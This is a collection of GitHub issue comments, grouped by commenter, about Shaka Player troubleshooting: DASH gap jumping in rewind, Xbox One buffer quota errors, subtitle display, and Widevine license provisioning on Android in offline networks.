    "gaxunil": "What version of Shaka Player are you using?:\n2.3.3\nCan you reproduce the issue with our latest release version?:\nI believe 2.3.3 is the latest, so yes.\nCan you reproduce the issue with the latest code from master?:\nWorking on trying, don't know yet\nAre you using the demo app or your own custom app?:\nCustom App: Shaka as a Tech backend to VideoJS\nIf custom app, can you reproduce the issue using our demo app?:\nI have not tired yet.  I think I would need to run the demo app locally as our manifest are behind private infrastructure.  If there is a way to do this, let me know.\nWhat browser and OS are you using?:\nChrome: 65.0.3325.162 (Official Build) (64-bit) \nOSX: 10.13.3\nWhat are the manifest and license server URIs?:\nI know you said you need a URI, but they are protected behind private infrastructure.\nHere's an MPD for a problem case:\n```\nremoved-private-url\n\nmanifest.mpd generated by GPAC\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n```\nWhat did you do?\nWe have a project that is using Shaka wrapped as a Tech to VideoJs.\nI'm investigating issues on MPEG DASH playback of on demand videos with gaps. On normal playback, Shaka seems to understand when it hits a gap and jumps over it correctly.\nOur asset / manifest URLs are all behind a private VPC / App.\nOn rewind, things don't work so well. What I see via logging is that when we hit a gap in rewind, Shaka starts triggering largegap events and doesn't seem to know the correct duration of the gap. I see ever increasing gapSizes doubling with every call. It seems like Shaka is just trying to increasing gap sizes, hoping the next largegap event will give a gapSize that lands outside the gap.\nexample from our gap handler logs, notice how gapSize increases:\n```\n{currentTime: 30.833731, gapSize: 1.326267999999999, bubbles: false, cancelable: true, defaultPrevented: false, \u2026}  \n{currentTime: 29.507463, gapSize: 2.652535999999998, bubbles: false, cancelable: true, defaultPrevented: false, \u2026}  \n{currentTime: 26.854927, gapSize: 5.305071999999999, bubbles: false, cancelable: true, defaultPrevented: false, \u2026}  \n{currentTime: 21.549855, gapSize: 10.610143999999998, bubbles: false, cancelable: true, defaultPrevented: false, \u2026}\n```\nAnd so on, until we backtrack outside of the gap, usually overshooting it by quite a lot.\nI'm not sure why Shaka doesn't use the MPD manifest Period information, which contains a start and duration for each Period. With this info, it seems like Shaka could know where the gaps are and jump over them (in both play AND rewind) without having to do the gapSize doubling algorithm.\nIn hopes of handling the gap jump in our largegap handler, I tried grabbing the parsed manifest from the Shaka player via the getManifest() function, but I couldn't find any Period duration information in the data structure returned. It seems like a duration or end time is needed to figure out where gaps start and end.\nWe setup into rewind mode by calling trickPlay(-2) to enter rewind.\nWe attempt to handle gaps in rewind in our largegap handler by calling videojsPlayer.currentTime(gapEvent.currentTime - gapEvent.gapSize)\nOur gap related settings are these:\nstreaming: {\n        jumpLargeGaps: true,\n        smallGapLimit: 0.0 \n}\nWhat did you expect to happen?\nExpected Shaka to know about gaps in rewind mode and jump them without the doubling search / guess algorithm for gap length.  Or to provide accurate gap length to the largegap event handler, or for the parsed manifest to provide Period duration or endTime so I could maybe handle the gap myself.\nQuestions:\n\nShould Shaka be able to handle jumping over gaps in rewind?\nWhy doesn't Shaka know the gap boundaries (from the MPD) to handle rewind?\nShould the parsed manifest have Period duration or end time somewhere?\nIs there a better way to handle this that I'm missing?\n\nWhat actually happened?\nShaka provides gap lengths on increasing doubling algorithm, probably trying to find the end of the gap.  We set the playhead like this:\nvideojsPlayer.currentTime(gapEvent.currentTime - gapEvent.gapSize)\nWhich will overshoot the gap usually.\nThe player will either overshoot the gap and put you back too far in the video, or, if the gap is close to the beginning, cause a seek back to the very beginning of the video.\n. @TheModMaker thank you so much for the explanation and info!  I'll take this back to our team and we'll figure out how we want to proceed.  Having that explained makes it much clearer.. @TheModMaker one follow up question - is the Period end time or duration available anywhere?  For our use case on rewind, if we knew the Period boundaries, we could probably detect the gaps on our end and adjust.  Is this info available at all in the parsed MPD data structure returned from ShakaPlayer.getManifest() for example?. ",
    "wayneseymour": "bump. ",
    "stanislavche": "@ismena @TheModMaker I have sent email with our manifest link. @ismena I've send you email. Please check it as soon as it possible. @joeyparrish Windows 10 OS. I have send email with our link / credentials and some instruction. I can forward this email to you or someone else.. ",
    "Mathieu-R": "When I bind the audiocontext before init shaka-player, I don't have that error. I'm inverstigating.. Update :\nI have bound the audiocontext at the lauch of the app. Now I don't have this error anymore but, the music is no played as I click on a track (it's loaded by shaka-player but not played by the audio element). This problem disappear if I comment the initWebAudioApi() function.\n```js\ncomponentDidMount () {\n  this.initWebAudioApi();\n  this.initShakaPlayer();\n  this.initMediaSession();\n}\ninitWebAudioApi () {\n  // create a new audio context\n  this.context = new (AudioContext || webkitAudioContext)();\n  // bind the context to our  element\n  this.source = this.context.createMediaElementSource(this.audio.base);\n}\n```. Thanks ! That works perfectly.. The number of bytes downloaded.\nEverytime, I do a player.load(manifestURL), I would like to be able to track the number of bytes streamed.\nMy use case is that I would like to allow the user in my app to set a limit of data. He would be able to set let's say 500mo of max data volume. \nOnce he reached that volume, I disable the possibility to play a song (until next month for instance) that is not put in cache (in my case - service worker - cache api).\nI could also show a beautiful UI where I could show how much data he consumed this month in my app.\nFor now I am only able to track how much data is downloaded (by download I mean through a button who performs some fetch() and put the responses in the cache-api) because I have a control on the response object but not how much data is streamed.\nHope it is clear \ud83d\ude00 . Yeah it seems.\nI'm gonna try this.\nThanks a lot \ud83d\ude00 . Yeah, the examples I found used buffer so I don't know how to do with streaming ? @michellezhuogg . Yes.. First, thanks for your answer.\nHere's the code that create a ranged-response in my service-worker. \nYou can find the part where I set the header in the bottom. \n```js\nconst createRangedResponse = (request, response, rangeHeader) => {\n  return response.arrayBuffer().then(buffer => {\n    // aaa-bbb, aaa, bbb\n    let [full, start, end] = /(\\d)-(\\d)/.exec(rangeHeader);\nif (start === '') {\n  start = buffer.byteLength - Number(end);\n  end = buffer.byteLength;\n} else if (end === '') {\n  start = Number(start);\n  end = buffer.byteLength;\n} else {\n  start = Number(start);\n  end = Number(end) + 1;\n}\n\nif (start < 0 || end > buffer.byteLength) {\n  return new Response('Range not satisfiable', {status: 416});\n}\n\nconst slicedBuffer = buffer.slice(start, end);\nconst slicedResponse = new Response(slicedBuffer, {\n  status: 206,\n  headers: response.headers\n});\n\n//console.log(`ranged response from service-worker from ${start} to ${end}`);\n\nslicedResponse.headers.set('x-from-cache', 'true');\nslicedResponse.headers.set('Content-Length', slicedBuffer.byteLength);\nslicedResponse.headers.set('Content-Range', `bytes ${start}-${end - 1}/${buffer.byteLength}`);\nreturn slicedResponse;\n\n});\n}\n``. I tried again in production mode with all your tips.\nI still don't getX-From-Cache` header however if I check the response in the network panel of chrome. I have this header.\n\nFor the hosted page: https://www.streamwave.be/. I definitely have control on my headers in my CDN.\nI will do that.\nI couldn't thank you enough !. @TheModMaker How did you test if the header x-from-cache is gettable ?\nI added Access-Control-Allow-Headers: X-From-Cache on my CDN, but still don't get it.. Yes, the problem is on the nginx side. \nClosing the issue.. Thanks but can I pass whatever data type I want to setAppData (like an object) ?. Yes thanks. @joeyparrish Shouldn't the receiver be controlled by the app when casting. \nIf I hit pause, seek, change music or whatever else on the app, it does not reflect on the receiver.\nAnother question, I'm sending my assets through setAppData but when I try to update receiver UI, it makes all crash (I mean no sound on the receiver).\nYou can check the receiver code here : https://github.com/Mathieu-R/streamwave-presentation in sw-presentation.js especially the method (initShakaPlayer() and metadataCallback (data)). The problematic line is the line 103 : this.updateUI(data).\nThanks.. Yes, and for the second question ?. How could I forgot to bind \ud83d\ude2e Thanks to point to that.. ",
    "stuartflanagan": "@shaka-bot reopen\nI am very sorry I did not see this notification.\nThis issue has evolved a bit since I created it and is affecting all browsers including Chrome.\nAt present we are trying to ascertain if the issue we are experiencing lies with the player, manifest or license acquisition.\nThe manifests we have been provided are supposed to be configureed identically.\n1 plays without issue and the other does not. It does not seem to throw an error but does not playback at all.\nIs it possible to get some assistance as to why this may be as the provider of the manifest says that there is no difference in the configuration.\nI have emailed 2 files with the streams and a blanket key.\nBoth have the same configuration but point to a different manifest.\nAgain sorry for the lateness of my reply.\nKind regards,\nStuart Flanagan.. Thank you very much for the response and information.\nI will close this ticket now and provide the information to the generators of the manifest.. I did try setting the switchInterval to a higher value but this did not help.\nIt seems to be hit and miss actually. Sometimes it plays back smoothly and other times it jumps or halts every few seconds. If you are happy to have a look I can email a test file with a test manifest and key.\nKind regards,\nStuart. Any chance of some information regarding this?\nPlease let me know if I should create a bug instead.. ",
    "enteractive-dev": "Thanks for looking into this. How come the Intertrust test app works even with the HDCP restriction enabled? Is it simply ignoring the (reported) device capabilities, starts playback anyway and gets lucky?. I was also using Widevine with the Intertrust app. PlayReady seems unproblematic even with high OPLs.\nThanks for the robustness tip. I'll give this a try when I'm back at the office after the Easter holidays but I guess browser playback might fail with these. So we might need separate license settings for each device.\nThank you all. I'll update this issue next week.. 'videoRobustness': 'SW_SECURE_DECODE', 'audioRobustness': 'SW_SECURE_CRYPTO' seems to be a good setting for this scenario and also works with slightly dated computer hardware.\n\u00a0 | Chromecast 1 | Chromecast 2 | NVidia Shield | Philips 32PFS6402/12\u00a0\n-- | -- | -- | -- | --\nSW_SECURE_CRYPTO | FAIL | OK | FAIL | FAIL\nSW_SECURE_DECODE | OK | OK | FAIL (OK) | FAIL (OK)\nHW_SECURE_CRYPTO | OK | OK | OK | OK\nHW_SECURE_DECODE | OK | OK | FAIL (OK) | FAIL (OK)\nHW_SECURE_ALL | OK | OK | FAIL (OK) | FAIL (OK)\n*) audioRobustness: SW_SECURE_CRYPTO / HW_SECURE_CRYPTO\nBtw. It seems https://www.gstatic.com/cast/sdk/libs/mediaplayer/1.0.0/media_player.js defaults to HW_SECURE_CRYPTO.. ",
    "mounirlamouri": "Out of curiosity, how would you use powerEfficient with data-saver?. Would it make sense to have something like:\njavascript\nvar playPromise = shakaDemo.video_.play();\nif (playPromise !== undefined && 'mediaSession' in navigator) {\n  playPromise.then(function() {\n    navigator.mediaSession.metadata = new MediaMetadata({ title: asset.name });\n  });\n}. Should the play promise check be first then?. ",
    "chcunningham": "\nBut what if stereo audio were smooth and 5.1 surround were not? We don't know if that would ever happen in practice, but from the API itself, this is a possible outcome.\n\nAdding a little color here - in chrome, especially for unencrypted, the audio configuration will not affect smoothness. \nThere is a hypothetical scenario where UAs in very constrained devices (e.g. TVs, cast devices, etc) could theoretically be impacted by the audio configuration. For instance, say audioConfigA means can choose internal pipeline A which leverages their hw chip to smoothly decode the corresponding video configuration. But audioConfigB might only be available in a SW pipeline and they don't support running both pipelines in parallel -> less smooth video. But this is pretty contrived and the real world may never hit this problem. \nYou might just use the API in whatever way is most valuable to you and keep some metrics to indicate whether you ever encounter this hypothetical audio filtering problem. I think chances are low, maybe zero, but I'd be excited to learn otherwise. . ",
    "Moussa": "\nWe can't reproduce your issue with a snapshot of a live manifest. To reproduce, we would need a playable manifest URI. (We would also need an XBox One, which we do not currently have.) If there is any way you can share a live URI with us, even privately, please do. \n\nI've confirmed the issue is reproducible with the snapshot manifest I grabbed, but as mentioned it's only reproducible in Edge on the Xbox One, and not desktop Edge. Providing a live manifest URI ourselves is very difficult, as we have a server component that generates the manifest. We would need to start a session on the server at the same time for someone using the manifest.\n\nEmbedded devices such as the XBox One typically have smaller quotas than desktop computers, so this is not unusual on its own.\n\nIndeed, our measurements show the media source buffer has a size of around ~90mb. I've tried setting a streaming.bufferBehind value of 2 as suggested but that seems to have no impact on the issue. We still see failure at roughly the same timestamp. Let me know if there's any logging I can provide that might help identify whether it's a browser issue or Shaka issue.. That's great! With a retail Xbox One console there isn't a way afaik to access the browser console or attach a debugger (I suppose if you really wanted to you could modify Shaka to emit logging to another local server rather than the console). But if you register your console as a development console (there's a small fee), you can create a simple HTML5 UWP app and run it on the device from Visual Studio, which has a debugger/console. I can provide the UWP app if it helps.\nIn the meantime I grabbed some Shaka logs myself, though I'm not sure how helpful they'll be.. @TheModMaker To clarify, are you running it on an Xbox One? The issue is only present when running inside Edge on the Xbox One.\nTo reproduce I only need to load the nightly demo/our custom player with the manifest I linked, and let it play for ~12 minutes. But to avoid network issues I'm running a local server which servers the manifest and segments. I've rerun playback with verbose logging, here is the output. Hope that's more helpful.. @TheModMaker Ah, I think the behaviour is slightly different depending on which OS your console is on. There is currently a big update being beta tested by some users, which comes with a new Edge version. In both cases playback stops at around the same point, but in the new Edge I see the QuotaExceededErrors. If need be I can get your and your colleague's Xbox Ones into the testing ring via my MS contacts, so that you can test against the upcoming update. Let me know.. @TheModMaker I suspected a platform bug too, so I reported it to a Microsoft contact who passed it on to the Edge team. So there is no publicly filed issue we can track. I'll wait to hear back from them first, but feel free to file it if you wish in the meantime. Thanks again!. ",
    "rahulkrish": "@Moussa @TheModMaker Has there been any updates on the above issue ? We are getting the QuotaExceededError while playing back a Live stream on Xbox One OS Version - 10.0.17134.3036. The stream happen to playback fine for an hour or so before throwing the error. Any workarounds to this ? We did try tweaking the streaming.bufferBehind as @joeyparrish had suggested but no visible difference in behaviour. Any help or advice would be much appreciated!. ",
    "jayku4u": "\nAccording to a private thread with Microsoft, this platform bug is triggered by the combination of MediaSource and DOMParser. We use DOMParser to parse the XML in a DASH manifest. This is the only web API available for XML parsing as far as we know.\n\nIf this issue is caused by the combination of MediaSource and DOMParser, then having a js-polyfill will not be an effective workaround. Is there anyway to mitigate the MediaSource bug?. ",
    "eladonline": "I added  track.setTextTrackVisibility(true) to the line after const [track] = player.getTextTracks();\nand still nothing I have  only the shaka default textTrack wich is playing nothing. still waiting for reply. joeyparrish Im sorry if you feel I was pressing you to answer it was not my intention\nI just wanted to not be forgotten \nnow to the problem \nI changed it to player.setTextTrackVisibility(true) \nit made the default doing nothing \"shaka track\" disappear, but still doesnt play subtitles or making a subtitle item in the  subtitle  menu \nI want to add that when testing the link in jawplayer testplayer it shows subtitles. hey sorry fro the wrong information \nthe currently use version is 2.3.4 \n(BTW I  updated to 2.3.6 and it threw a lot of errors so I downgrade it again)\nI open my chrome with this command\nchrome.exe --user-data-dir=\"C:/Chrome dev session\" --disable-web-security\nand when trying to run the mpd url on your 'shaka demo' it throws an err 1002 \n\nif you want the url of the mpd, I sent it to your supp email.\nthe head of the email holds this issue id track #1401\nso you can try it too. hey @joeyparrish I did as you asked opened in --disable-web-security and checked \"Bypass for network\"\nbut still same error message \nI sent a reply on my last empty email with the mpd url for you to try \nthanks :)\n. @joeyparrish hey did you find something? . @ismena  yes it is the problem\n. @ismena  I`ll check that and comment if it works thanx! \n. @ismena I did as you asked and it works issue can be close, tvm!\nNeed to mention that if One use shaka player with big companies \nit is impossible to stand in the translation criteria\nbecause every company use her tool to make translates and some make more spaces \nthis propblem is only in shaka player other players work well with this \nmaybe this issue should turn into a suggestion. ",
    "dsparacio": "@joeyparrish Hi Joey been a while hope all is well?  Wondering if you guys are looking at https://github.com/Dash-Industry-Forum/cea608.js for implementation. HLS.js used this and of course we used it for Dash.js.  Feel free to use this if it suites your needs!\nUpdate\nI guess I overlooked the mention on that url so you are aware.  just wanted to make sure!. ",
    "ronenneumark": "@joeyparrish  - on which shake player version supporting CEA608 in mp4 will be available?. @rbond  - can you share the supported in band cases?. HI @joeyparrish - thanks for your help! we ask our content provider to make the needed changes and work with a standard DTS/PTS settings . ",
    "rbond": "Second that on 608 on mp4. We have many use cases for pulling captions in band.. ",
    "Thiagobhmg": "I'm interested in using the player's offline functionality, so I asked\nif the player plays mp3. Do you know any players who have the same\noffline functionality as Shaka?\nThiago Franklin\nINSTITUTO SER\np: (31) 3243-6601  m: (31) 99354-7292\ne: thiago.franklin@portalser.org\n2018-04-17 12:13 GMT-03:00 Chris Fillmore notifications@github.com:\n\nIt's possible to play mp3 files using an  element, Shaka is not\nrequired:\nhttps://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1410#issuecomment-382029340,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AjCyeCH9TEeghmjKiDSBD5z13PkNvh0yks5tpgaIgaJpZM4TWbxM\n.\n. \n",
    "sparkyish": "@joeyparrish I think the way Shaka currently uses the term \"adaptation\" confuses this conversation. I'd like to clarify the terms dealing with ABR between HLS & DASH to help.\nWith HLS, multiple versions of the same content encoded in different ways (with differences in bitrate, resolution, etc) are called Variant Streams. Alternate versions of different content, such as audio produced in different languages or video recorded from different camera angles, are called Renditions. \nWith DASH, multiple versions of the same content are called Representations, and alternate versions of different content are called Adaptations. ABR is possible by switching between representations; alternate languages and camera angles are possible through switching adaptations. If you need more reading, here is a short blog post about it.\nI believe Shaka calls a change in the stream due to network conditions an adaptation, hence the confusion, since with DASH an adaptation is different content instead of a change in quality. So in essence, yes I am looking to support multiple camera angles, but those are contained in DASH adaptations, which I do not think are supported correctly in Shaka at the moment. . @TheModMaker thank you for correcting and extending my summary; I was not aware that DASH allowed for having perceptually identical content in two different adaptation sets for cases such as those. I am glad to learn about adaptation-set-switching. It is also good to know the assumptions of the current player behavior. \n@ismena thank you for that clarification. I do believe that end users will want to change video selections without effecting audio (and vice versa). With the current structure, I am assuming this might involve 1) creating a list of all unique adaptations (excluding duplicate adaptation-set-switching sets) grouped by type (audio/video/subtitle/etc.) to present to the user, and 2) updating the player with the appropriate variant pair by combining the user's selection from the list with the other currently loaded adaptation. Or maybe you know a better way... Any guidance would be greatly appreciated! . ",
    "philhar": "As an aside, this stream stops after 10s in Chrome 68:\n\nShaka Error MEDIA.VIDEO_ERROR (3,,PIPELINE_ERROR_DECODE: DecryptingDemuxerStream: decrypt error). \n",
    "tbrixi": "Problem is partly in our implementation when we setting player to null immediately after destroy().\nI am able to reproduce problem on \"shaka-player\\docs\\tutorials\\basic-usage.md\", if I set player to null after destroy();\nvar player;\n...\nfunction onError(error) {\n  // Log the error.\n  console.error('Error code', error.code, 'object', error);\n  player.unload();\n  player.destroy();\n  player = null;\n}\nshaka.js:284 Uncaught (in promise) TypeError: Cannot read property 'onError' of null\n    at cg. (shaka.js:284)    . ",
    "frhi": "We were using a Styled Media Receiver. I have not developed for Chromecast before and didn't realize we needed to make a custom receiver app. So I took a look at the Shaka receiver app you mentioned and we've got it working now. Thanks for the help!. @TheModMaker I'm not setup to compile the shaka player (i've always just grabbed compiled versions). Is there a way to get a compiled version of the latest that would include the change you mentioned?. @TheModMaker The nightly build appears to have the same issue. On https the chromecast button appears like you'd expect, but when loaded using http, the chromecast button does not appear.. So I noticed the following webpage: https://developers.google.com/cast/docs/chrome_sender/\nsays: \"Warning: Chrome sender apps need to support HTTPS to maintain Cast compatibility, as Chrome is deprecating support for the Presentation API on insecure origins.\"\n... which I think is what joeyparrish was getting at. Assuming that page is applicable to this situation, then I guess that explains it?. ",
    "chahatmiddha561": "@TheModMaker - Hi, as you mentioned it is required to set range header for the first segment but can we customise using shaka configuration to not send range header in any case?\nOr any flag we can set which will stop sending Headers with range for the first segment ?\nhttps://github.com/google/shaka-player/issues/1431#issuecomment-387812986. @TheModMaker - Hi, as you mentioned it is required to set range header for the first segment but can we customise using shaka configuration to not send range header in any case?\nOr any flag we can set which will stop sending Headers with range for the first segment ?\nhttps://github.com/google/shaka-player/issues/1431#issuecomment-387812986. ",
    "grantg182": "Yes, we are using the ShakaPackager but are not specifying the --clear_lead parameter - in any case, the devices which fail to playback do not even attempt to playback the first 10s of default clear content.. Yes, we are using the ShakaPackager but are not specifying the --clear_lead parameter - in any case, the devices which fail to playback do not even attempt to playback the first 10s of default clear content.. Hey @joeyparrish \nYour license server does not have access to the open internet, correct?\nThat is correct, it is hosted on the local server in an offline environment.\nAre you trying to set up some kind of self-contained, isolated network that can still give out content licenses locally?\nYes, that is correct. \nYour license server is not a Widevine license server proxy, correct?\nCorrect, the license server is a Docker component and is fully accessible on the network (in requests, inspecting traffic, etc, via other devices, including Android devices from Samsung).\nWhat network traffic is sent by the browser?\nAbsolutely none. On Desktop Chrome, we can see the license server request coming from the browser and can inspect this no problem. However, on the Android devices which are failing, there is not even a request made to the license server.\nAre there any connections attempted from the browser out to the internet?\nNo, all requests go to our local proxy server which forward on to the license server; all within the local network. Inspecting the Android logs, shortly before and after the failure (presumed) of GenerateKeyRequest, there are attempts by the devices to connect to api.google.com (or similar, definitely a google URL containing api, though this may be a red herring with the Android devices attempting to upload/download data to other Google services).\nWhat network traffic is sent by the license server?\nNone, since the Chrome browser on these Android devices are not even making a request to the license server. \nAre there any connections attempted from the server out to the internet?\nNo, I have inspected all network traffic and access logs and can confirm neither client nor server attempts to connect to the internet.\nWhat I suspect, is that the devices are being provisioned by Widevine on a domain basis, though I am not able to confirm this as yet. If I remove the Media Licenses within Chrome and go back to the UAT demo video, I get the \"premium content\" popup and then can get successful playback after accepting. Then connecting solely to our intranet, I get the same \"premium content\" popup, upon acceptance, no playback and the error as before. It was my understanding devices were provisioned once with Widevine, but it appears that may not be the case.\nIf it helps, I posted some of the logs from Android on the Widevine forum, in case that sheds any light.\nI am 99% certain this is not an issue with Shaka itself, though I intend to deploy an instance of dashJS or similar tomorrow to remove any doubt.\nThanks again!. Hey @joeyparrish \nYour license server does not have access to the open internet, correct?\nThat is correct, it is hosted on the local server in an offline environment.\nAre you trying to set up some kind of self-contained, isolated network that can still give out content licenses locally?\nYes, that is correct. \nYour license server is not a Widevine license server proxy, correct?\nCorrect, the license server is a Docker component and is fully accessible on the network (in requests, inspecting traffic, etc, via other devices, including Android devices from Samsung).\nWhat network traffic is sent by the browser?\nAbsolutely none. On Desktop Chrome, we can see the license server request coming from the browser and can inspect this no problem. However, on the Android devices which are failing, there is not even a request made to the license server.\nAre there any connections attempted from the browser out to the internet?\nNo, all requests go to our local proxy server which forward on to the license server; all within the local network. Inspecting the Android logs, shortly before and after the failure (presumed) of GenerateKeyRequest, there are attempts by the devices to connect to api.google.com (or similar, definitely a google URL containing api, though this may be a red herring with the Android devices attempting to upload/download data to other Google services).\nWhat network traffic is sent by the license server?\nNone, since the Chrome browser on these Android devices are not even making a request to the license server. \nAre there any connections attempted from the server out to the internet?\nNo, I have inspected all network traffic and access logs and can confirm neither client nor server attempts to connect to the internet.\nWhat I suspect, is that the devices are being provisioned by Widevine on a domain basis, though I am not able to confirm this as yet. If I remove the Media Licenses within Chrome and go back to the UAT demo video, I get the \"premium content\" popup and then can get successful playback after accepting. Then connecting solely to our intranet, I get the same \"premium content\" popup, upon acceptance, no playback and the error as before. It was my understanding devices were provisioned once with Widevine, but it appears that may not be the case.\nIf it helps, I posted some of the logs from Android on the Widevine forum, in case that sheds any light.\nI am 99% certain this is not an issue with Shaka itself, though I intend to deploy an instance of dashJS or similar tomorrow to remove any doubt.\nThanks again!. Thanks @joeyparrish - some insight from other teams would be great!\nYou would think the CDM would 'just work' after being provisioned - it works on all other Widevine-encrypted content using a variety of other players on the internet, but not on our network, before and after getting successful playback on the open internet.\nQuite worrying really; I've had more device failures than successes; even more so because every Huawei device has failed with the same error - and look to be overtaking as the second largest smartphone manufacturer!\nCheers. Thanks @joeyparrish - some insight from other teams would be great!\nYou would think the CDM would 'just work' after being provisioned - it works on all other Widevine-encrypted content using a variety of other players on the internet, but not on our network, before and after getting successful playback on the open internet.\nQuite worrying really; I've had more device failures than successes; even more so because every Huawei device has failed with the same error - and look to be overtaking as the second largest smartphone manufacturer!\nCheers. Thank you again @joeyparrish ! Much appreciated.\nThat makes sense, given the testing we have done. I was afraid that was going to be the outcome. |\nI'll have a dig through the MediaDRM documentation, if I can locate it, and see what we can find out and where we can go next.\nThanks again,\nGrant\n. Thank you again @joeyparrish ! Much appreciated.\nThat makes sense, given the testing we have done. I was afraid that was going to be the outcome. |\nI'll have a dig through the MediaDRM documentation, if I can locate it, and see what we can find out and where we can go next.\nThanks again,\nGrant\n. Hi @onetae \nUnfortunately you will require an Offline Provisioning Server to resolve the issue. You'll find everything works just fine in Chrome <58 - it seems that the VMP update for Chrome also slipped in this change which means devices need provisioned every time (or at least, for every domain, license retrieval attempt, or something).\nSo far, I have not had great success from the Widevine team in obtaining such a thing.. Hi @onetae \nUnfortunately you will require an Offline Provisioning Server to resolve the issue. You'll find everything works just fine in Chrome <58 - it seems that the VMP update for Chrome also slipped in this change which means devices need provisioned every time (or at least, for every domain, license retrieval attempt, or something).\nSo far, I have not had great success from the Widevine team in obtaining such a thing.. I hope so @onetae - thus far, I have not had a response from the Widevine team 2 months later.... I hope so @onetae - thus far, I have not had a response from the Widevine team 2 months later.... @ryancl01 No, I have not. The Widevine Partner License SDK document I have is v1.12.1 which only has 23 pages. I get a 403 on the Widevine SDK document link within the CWIP portal too, so cannot currently access the latest documentation for some reason(?). Alas, I'll try figure out how to PM you...\nFail. Can't seem to find a way to drop you a message @ryancl01 as it doesn't appear you have any public commits. I have made my email public on my profile if you don't mind dropping me a mail. Cheers.. @ryancl01 No, I have not. The Widevine Partner License SDK document I have is v1.12.1 which only has 23 pages. I get a 403 on the Widevine SDK document link within the CWIP portal too, so cannot currently access the latest documentation for some reason(?). Alas, I'll try figure out how to PM you...\nFail. Can't seem to find a way to drop you a message @ryancl01 as it doesn't appear you have any public commits. I have made my email public on my profile if you don't mind dropping me a mail. Cheers.. @ryancl01 Great, thank you!. @ryancl01 Great, thank you!. @ryancl01 We have tested with a variety of devices with various versions of Android and Android forks.\nUp to and Chrome 58, we have no issues with license requests in an offline environment on any of these devices.\nAfter Chrome 59, here are some examples of devices I tested 2 months ago:-\nSamsung Galaxy S8 - Android 7.0, Chrome 66\nSamsung Galaxy S6 -Android 7.0, Chrome 66\nHuawei Nova Lite - Android 7.0, Chrome 66\nHuawei P8 - Android 6.0, Chrome 66 *\nHuawei P10 - Android 7.0, Chrome 66\nHowever, in the same environment, the following devices did successfully get a license and successfully played Widevine-encrypted content:-\nLG V30 - Android 8.0.0, Chrome 66 \nSamsung Note 3 - Android 5.0, Chrome 66 **\n\nHuawei P8 - previously received license and played encrypted content without any issues from a different license server, albeit in the same offline environment approximately 18 months ago, so probably Chrome 54-56 and always Android 6.\n\n** Samsung Note 3 - it is possible that it had previously received a license via another license server which did have internet access some 12+ months ago, so on a previous version of Chrome but same Android version. Unable to verify further by factory reset as this is a colleagues personal device.\nThanks,\nGrant. @garfieldjty just as an FYI, this issue is tracked by Chromium here - https://bugs.chromium.org/p/chromium/issues/detail?id=866625\nNote, it is targeted for Chrome 74. It has previously been targeted for Chrome 70, 71, 72 and 73. However, it has been 'started' and 'assigned' to a Chromium dev since January 11th. As yet, it is still not working in the latest build of Canary.. Yeah, after wasting the better part of 2 days trying to figure out if this was something I had done (after making several changes to the frontend before upgrading to 2.4), I suspected something had gone awry in 2.4. Will have to revert back to 2.2 unless there's some quick fix to implement. \nThank you for the quick response \ud83d\udc4d . Great, will keep an eye out. Would be great to not have to revert back to the old methods. I've actually got Shaka set up with a handler which handles pre-roll ads before we init() - coincidentally the exact purpose of the change which caused this broken behaviour! \ud83d\ude3f . Thanks.\nSo I've yet to have had a need to bring in a specific commit. Instead, just pulled master and ran with it.\nSo here's what I've done:-\nDropped drm_engine.js from this commit into /lib/media/ then did a rebuild, using python build/all.py then took the new shaka-player.compiled.js and shaka-player.uncompiled.js and replaced the old version of these (i.e. from 2.4 master).\n~~Cleared all browser cache in Safari and unfortunately I'm still hitting the same error.~~\nPlease forgive my noob error. I forgot we referenced shaka-player.compiled.js in another location - replaced that version and we have lift off! Thank you very much.\nWorking just fine with clear (Safari and Chrome) and DRM (Widevine - Chrome) content.. Sorry, edited my last post, all working here now too. Thanks again!\nOn Thu, 28 Jun 2018, 23:46 theodab, notifications@github.com wrote:\n\nHm. My change fixed playback for the assets Jacob provided. I don't think\nyou could have installed it wrong, since the changes were pretty standalone.\nWell, whatever. I can look into this more next week. In the meantime, it'd\nhelp if you could provide a public server link for the assets in question,\nto shaka-player-issues@google.com. Plus steps to reproduce on the demo\napp, if possible?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1479#issuecomment-401195624,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AHFqgcl-hPLfVX-IQBKQxYbpxigYMLfiks5uBVzKgaJpZM4U7qCo\n.\n. Hey @joeyparrish . Thanks for your reply. \n\nAs I said I have not yet set up retryParameters. Does this mean, once those are implemented, an error will be thrown once maxAttempts has been reached? I'll give that a spin later today and see where that leaves me. . Thanks @joeyparrish. That did the job; cheers.. @joeyparrish yep, that'll do it. Will look into a solution shortly and hopefully it'll do the trick when the time comes. Thanks @chrisfillmore !. ",
    "onetae": "Hi @grantg182 \nDid you solve this after? I am having the same problems with offline android and would like to compare notes. \nThanks Matt. Hi @grantg182\nThanks for the info, you saved me a few days which I would of spent coming to the same conclusion.\nWe contacted Widevine and they are aware of this problem, and looking to solve it.\nWhich isn't much good to us.\nRegards\n. Hi Guys,\nYou can also set the serverCertificate in the Shaka player in the advanced drm area:\nYou set it as a Uint8Array, see below.\nI tried both ways: setting it in the player and setting it in the widevine SDK as stated in the document.\nBut still have no luck with later versions of Android.\n  player.configure({\n        drm: {\n          servers: { 'com.widevine.alpha': 'https://widevineServer/?id=ac5499b1-4240-4616-b475-c8440d5ffeea' }\n       , advanced: {\n              'com.widevine.alpha': {\n              **'serverCertificate' : arryCert,**\n              'distinctiveIdentifierRequired' : false,\n              'videoRobustness': 'SW_SECURE_CRYPTO',\n              'audioRobustness': 'SW_SECURE_CRYPTO'\n                      }\n                    }\n        }\n    });\n\n. ",
    "ryancl01": "@grantg182 Have you tried setting the service certificate for the client as outlined in page 30 of the License Server SDK document?  If you need more detailed instructions please send me a message and I can further assist off of github.  . @grantg182 Hi Grant no problem I just sent you an email with the latest document.. All, \nWhich version of Android did you first notice this problem?\nThanks,\nRyan. Thank you Grant.  I am working with Chrome engineering to investigate this and hope to have an update soon.. ",
    "TboneX": "@ryancl01 Is there any news on this matter? It's been a couple of months now. @ryancl01 Is there any news on this matter? It's been a couple of months now. ",
